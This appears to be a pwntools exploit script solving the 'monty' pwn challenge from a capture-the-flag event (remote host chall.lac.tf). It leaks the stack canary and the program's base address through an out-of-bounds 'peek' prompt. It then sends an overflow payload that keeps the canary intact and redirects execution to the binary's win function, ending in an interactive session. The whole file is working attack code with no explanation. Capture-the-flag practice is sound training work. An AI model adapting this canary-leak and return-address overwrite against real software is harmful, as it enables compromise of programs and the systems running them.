#!/usr/bin/python3

from pwn import *

exe = ELF('monty', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0000555555555632

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.lac.tf', 31132)
else:
        p = process(exe.path)

GDB()
sla(b'peek? ', '55')
p.recvuntil(b': ')
canary = int(p.recvline(keepends=False))
sla(b'peek? ', '57')
p.recvuntil(b': ')
exe.address = int(p.recvline(keepends=False)) - exe.sym.main - 48
info("canary: " + hex(canary))
info("exe base: " + hex(exe.address))
sla(b'lady!', '0')
payload = b'a' *8*3 + p64(canary) + p64(0) + p64(exe.sym.win+1)
sla(b'Name: ', payload)
p.interactive()
